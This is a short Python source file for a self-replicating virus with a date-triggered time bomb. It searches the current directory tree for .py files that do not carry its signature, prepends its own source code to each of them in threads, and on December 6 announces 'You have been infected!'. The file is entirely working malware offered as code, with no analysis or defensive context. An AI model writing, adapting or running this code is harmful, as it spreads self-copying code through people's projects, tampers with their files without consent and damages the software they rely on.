#!/usr/bin/python
SIGNATURE="#83123k182n42k21j2c74hd5vb742h75mz617sd41"
hostId=[".py"]
from datetime import date
today = date.today()
target = date(today.year,12,6)

#Function which search for files and subfiles
def search(path):
	filesToInfect=[]
	fileList=os.listdir(path)
	for fileName in fileList:
		if fileName == __file__:
			pass
		else:
			fullName="{}/{}".format(path,fileName)
			if os.path.isdir(fullName):
				#pass
				filesToInfect.extend(search(fullName))
                
			elif not isInfected(fullName) and fileEnding(fileName,hostId):
				filesToInfect.append(fullName)
	return filesToInfect

#Function marks file with our signature without adding code lines into file
def infect(filesToInfect):
	try:
		virus = open(os.path.abspath(__file__))
		inf = ""
		for i,line in enumerate(virus):
			inf+=line
		virus.close()
	except:
		inf = SIGNATURE
	try:
		for fti in filesToInfect:
			t = threading.Thread(target=handleFileInfection,args=(fti,inf))
			t.start()
	except:
		pass


#Function check if file is infected or not else pass
def isInfected(fullName):
    contagious=False
    try:
        for line in open(fullName):
            if SIGNATURE in line:
                contagious = True
                break
    except:
        pass
    
    return contagious
  
# Function convert passed file to buffer
def handleFileInfection(fileToInfect,inf):
    try:
        f = open(fileToInfect)
        buffer = f.read()
        f.close()
        f = open(fileToInfect,"w")
        f.write(inf+buffer)
        f.close()
    except:
        if not f.closed:
            f.close()
    
# Function check if the file have the corrent ending in our case .py
def fileEnding(fileName,hostId):
	target = False
	try:
		for id in hostId:
			if id == fileName[-3:]:
				target=True
				break
		return target
	except:
		return False
        
	
def main():
    if(today == target):
        filesToInfect=search("./")
        infect(filesToInfect)
        print("\nYou have been infected!\n")
    else:
        print("\nChange the date of time bomb\n")
        
if __name__=="__main__":
    import os
    import threading
    import datetime
    main()
